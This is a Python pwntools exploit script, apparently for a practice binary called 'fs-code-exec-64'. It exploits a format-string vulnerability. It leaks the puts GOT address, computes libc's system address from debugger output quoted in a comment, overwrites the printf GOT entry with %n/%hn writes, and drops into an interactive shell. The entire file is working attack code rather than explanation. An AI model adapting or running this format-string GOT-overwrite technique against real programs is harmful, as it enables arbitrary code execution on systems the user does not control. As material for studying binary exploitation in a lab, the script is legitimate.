#!/usr/bin/env python
from pwn import *

env = { 'PATH' : '.:/bin:/usr/bin' }
p=process('./fs-code-exec-64', env = env)

e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))
got_of_puts = p.elf.got['puts']
print("Got of puts %s" % hex(got_of_puts))

'''
pwndbg> print puts
$1 = {<text variable, no debug info>} 0x7f6e6b06d690 <_IO_puts>
pwndbg> print system
$2 = {<text variable, no debug info>} 0x7f6e6b043390 <__libc_system>
'''

offset = 0x7f6e6b043390 - 0x7f6e6b06d690 #system - puts
print(offset)

print p.recvline()
buf = "%7$sBBBB" + p64(got_of_puts)
p.sendline(buf)

data = p.recvline()
print(data)
raw_data = data[6:12]
print(repr(raw_data))
raw_data = raw_data + "\x00\x00"
new_data = u64(raw_data)
print(hex(new_data))

libc_system = new_data + offset
print(hex(libc_system))

target = hex(libc_system)
lower = int(target,16) & 0xffff
mid = ((int(target,16) >> 16) & 0xffffffff) & 0xffff
higher = (((int(target,16) >> 16) & 0xffffffff) >> 16) & 0xffff
first = lower
second = mid + 0x10000  - lower
third = higher - mid
third = third + 0x10000

print(hex(lower))
print(hex(mid))
print(hex(higher))
print(first)
print(second)
print(third)

total = 22 + len(str(first)) + len(str(second)) + len(str(third))
print(total)
count = 8 - (total % 8)
print(count)

# got_of_printf = 0x601030
value = ""
value += "%"+ str(first) + "x" + "%11$n"
value += "%"+ str(second) + "x" + "%12$n"
value += "%"+ str(third) + "x" + "%13$hn" + "A" * count
value += "\x30\x10\x60\x00\x00\x00\x00\x00"
value += "\x32\x10\x60\x00\x00\x00\x00\x00"
value += "\x34\x10\x60\x00\x00\x00\x00\x00"

p.sendline(value)

p.interactive()
